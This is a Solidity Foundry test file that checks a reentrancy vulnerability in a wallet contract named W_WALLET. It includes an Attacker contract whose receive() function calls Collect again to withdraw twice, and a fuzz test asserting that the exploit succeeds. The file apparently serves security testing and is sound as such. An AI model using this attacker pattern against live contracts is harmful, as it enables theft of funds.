
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {W_WALLET} from "../src/W_WALLET.sol";
import {Log} from "../src/W_WALLET.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyW_WALLET is Test {
    using stdStorage for StdStorage;
    
    W_WALLET public _contractUnderTest;
    Log public _logContract;
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new W_WALLET(address(_logContract));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal < type(uint128).max);

        uint256 depositAmount = attackVal * 2;
        vm.deal(address(_contractUnderTest), depositAmount);
        vm.deal(address(_attacker), depositAmount);
        vm.deal(address(this), depositAmount);

        _attacker.setupAttack{value: depositAmount}(depositAmount, attackVal);
        
        vm.warp(block.timestamp + 1 days);
        
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    W_WALLET public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = W_WALLET(victimAddress);
    }

    function setupAttack(uint256 depositAmount, uint256 attackVal) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = attackVal;
        
        _victim.Put{value: depositAmount}(block.timestamp + 1 days);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        
        _victim.Collect(val);
        
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        
        if (attackCallCount == 1) {
            _victim.Collect(storedAttackVal);
        }
    }
}
